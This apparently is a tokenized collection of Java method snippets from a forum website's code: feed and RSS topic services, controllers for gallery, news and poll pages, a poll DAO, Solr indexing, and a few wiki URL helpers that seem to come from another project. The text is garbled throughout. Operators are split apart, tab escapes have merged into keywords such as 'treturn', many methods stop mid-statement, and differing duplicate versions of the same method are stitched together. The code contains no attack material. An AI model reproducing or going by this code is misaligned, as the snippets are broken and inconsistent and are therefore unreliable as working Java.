public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = feedTopicService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_GALLERY , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_FORUM , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_POLLS , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , Section . SECTION_NEWS , null , null , offset , request , response ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_GALLERY , offset , groupName , request , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_NEWS , offset , groupName , request , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_POLLS , offset , groupName , request , response ) ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView modelAndView = mainTopicsFeedHandler ( month , year , Section . getSection ( section ) , null , null , null , request , response ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public View showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " output " , required = false ) String output ) { if ( output ! = null ) { return new RedirectView ( " /people/ " + nick + " /?output=rss " ) ; } return new RedirectView ( " /people/ " + nick + '/' ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = feedTopicService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; List < FeedTopicDto . DeletedTopic > deleted = feedTopicService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) throws Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . toString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . toString ( year ) + '/' + Integer . toString ( month ) ) ; } if ( groupId ! = null ) { Group group = groupDao . getGroup ( groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
private void prepareTopicsForPlainOrRss ( HttpServletRequest request , ModelAndView modelAndView , String output , List < Topic > messages ) { boolean rss = output ! = null & & " rss " . equals ( output ) ; if ( rss ) { modelAndView . addObject ( 
private ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private void setExpireHeaders ( HttpServletResponse response , Integer month , Integer year ) { if ( month = = null ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public FeedTopicDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new FeedTopicDto . DeletedTopic ( rs ) ; } 
public String toString ( ) { return new StringBuilder ( ) . append ( FeedTopicDto . class . toString ( ) ) 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { feedTopicDto . setTag ( tagDao . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( tech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . toString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; feedTopicDto . setFromDate ( fromDate ) ; feedTopicDto . setNotalks ( noTalks ) ; feedTopicDto . setTech ( tech ) ; feedTopicDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? feedTopicDao . getTopics ( feedTopicDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . toString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; } feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; feedTopicDto . setFromDate ( fromDate ) ; return getCachedFeed ( feedTopicDto ) ; } 
public int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
private static String fixNL ( String text ) { return text . replaceAll ( NL_REGEXP , " [br] " ) ; } 
public void listTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { feedTopicDto . setTag ( tagDao . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public Poll createNew ( List < PollVariant > newVariants ) { return new Poll ( id , 
public PollVariant mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new PollVariant ( rs . getInt ( " id " ) , rs . getString ( " label " ) ) ; } 
public Poll getPoll ( final int pollId ) throws PollNotFoundException { final int currentPollId = getCurrentPollId ( ) ; try { return jdbcTemplate . queryForObject ( queryPool , 
public Poll mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Poll ( pollId , 
public Integer apply ( PollVariantResult input ) { return input . getId ( ) ; } 
public PollVariantResult apply ( PollVariant input ) { PollVariantResult pollVariant = currentMap . get ( input . getId ( ) ) ; if ( pollVariant ! = null ) { return new PollVariantResult ( input . getId ( ) , input . getLabel ( ) , pollVariant . getVotes ( ) , pollVariant . getUserVoted ( ) ) ; 
public PreparedTopic prepareTopicPreview ( Topic message , List < String > tags , Poll newPoll , boolean secure , String text ) { return prepareMessage ( message , 
public void voteGetCurrentPollTest ( ) throws Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; Assert . assertEquals ( currentPollId , poll . getId ( ) ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " FeedTopicService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; FeedTopicDto feedTopicDto = new FeedTopicDto ( ) ; if ( section ! = null ) { feedTopicDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . COMMITED_ONLY ) ; } else { feedTopicDto . setCommitMode ( FeedTopicDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { feedTopicDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { feedTopicDto . setTag ( tagDao . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; feedTopicDto . setToDate ( calendar . getTime ( ) ) ; } else { feedTopicDto . setLimit ( 20 ) ; feedTopicDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { feedTopicDto . setDateLimitType ( FeedTopicDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; feedTopicDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( feedTopicDto ) ; } 
public ModelAndView mainPage ( HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = jdbcTemplate . queryForInt ( " select count(*) from topics,groups,sections where section=sections.id AND sections.moderate and topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = jdbcTemplate . queryForInt ( " select count(*) from topics,groups where section=1 AND topics.groupid=groups.id and not deleted and not topics.moderate AND postdate>(CURRENT_TIMESTAMP-'1 month'::interval) " ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } return mv ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; Section section = null ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; modelAndView . addObject ( " section " , section ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; List < Topic > messages = topicListService . getAllTopicsFeed ( section , calendar . getTime ( ) ) ; modelAndView . addObject ( " messages " , prepareService . prepareMessagesForUser ( messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ) ; List < TopicListDto . DeletedTopic > deleted = topicListService . getDeletedTopicsFeed ( sectionId ) ; modelAndView . addObject ( " deletedTopics " , deleted ) ; modelAndView . addObject ( " sections " , sectionService . getSectionList ( ) ) ; return modelAndView ; } 
public TopicListDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new TopicListDto . DeletedTopic ( rs ) ; } 
public String toString ( ) { return new StringBuilder ( ) . append ( TopicListDto . class . toString ( ) ) 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagDao . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( 20 ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech , boolean feedBurner ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getRssTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . append ( " ; noTalks= " ) . append ( noTalks ) . append ( " ; tech= " ) . append ( tech ) . append ( " ; feedBurner= " ) . append ( feedBurner ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 20 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return ( feedBurner ) ? topicListDao . getTopics ( topicListDto ) 
public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; topicListDto . setFromDate ( fromDate ) ; return getCachedFeed ( topicListDto ) ; } 
private void updateMessage ( Topic topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " section " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , msgbaseDao . getMessageText ( topic . getId ( ) ) . getText ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Topic topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " section " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public static String encodeAndEscapeTopicName ( String url ) { if ( StringUtils . isBlank ( url ) ) { treturn url ; } tString result = encodeTopicName ( url ) ; ttry { tresult = URLEncoder . encode ( result , " UTF-8 " ) ; } catch ( UnsupportedEncodingException e ) { } 
public static String encodeTopicName ( String url ) { if ( StringUtils . isBlank ( url ) ) { treturn url ; } treturn StringUtils . replace ( url , " " , " _ " ) ; } 
public static String buildWikiURL ( String virtualWiki , String topic ) { StringBuilder url = new StringBuilder ( ) ; url . append ( " /wiki/ " ) ; url . append ( encodeAndEscapeTopicName ( virtualWiki ) ) ; url . append ( '/' ) ; url . append ( encodeAndEscapeTopicName ( topic ) ) ; return url . toString ( ) ; } 
List < Topic > getTopics ( TopicListDto topicListDto ) ; List < TopicListDto . DeletedTopic > getDeletedTopics ( Integer sectionId ) ; } 
List < TopicListDto . DeletedTopic > getDeletedTopics ( Integer sectionId ) ; } 
public void copy ( TopicListDto topicListDto ) { sections . clear ( ) ; sections . addAll ( topicListDto . getSections ( ) ) ; userId = topicListDto . getUserId ( ) ; userFavs = topicListDto . isUserFavs ( ) ; group = topicListDto . getGroup ( ) ; tag = topicListDto . getTag ( ) ; limit = topicListDto . getLimit ( ) ; offset = topicListDto . getOffset ( ) ; dateLimitType = topicListDto . getDateLimitType ( ) ; fromDate = topicListDto . getFromDate ( ) ; toDate = topicListDto . getToDate ( ) ; notalks = topicListDto . isNotalks ( ) ; tech = topicListDto . isTech ( ) ; commitMode = topicListDto . getCommitMode ( ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . getSections ( ) . add ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagDao . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( 20 ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public void getTopicsFeedYear_commonTest ( ) throws UserErrorException , TagNotFoundException { List < Topic > topicList = topicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( new Integer ( 11 ) , sectionId ) ; assertEquals ( 111 , topicListDto . getGroup ( ) ) ; assertEquals ( 123 , topicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , topicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , topicListDto . getCommitMode ( ) ) ; } 
public void getTopicsFeedYear_monthAndYearTest ( ) throws UserErrorException , TagNotFoundException { List < Topic > topicList = topicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , topicListDto . getDateLimitType ( ) ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( 2000 , 10 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , topicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; calendar . set ( 2000 , 11 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , topicListDto . getToDate ( ) . getTime ( ) / 1000 ) ; assertTrue ( topicListDto . getLimit ( ) = = null ) ; topicList = topicListService . getTopicsFeed ( section2 , null , null , 0 , null , null ) ; assertEquals ( TopicListDto . DateLimitType . MONTH_AGO , topicListDto . getDateLimitType ( ) ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; assertEquals ( calendar . getTime ( ) . 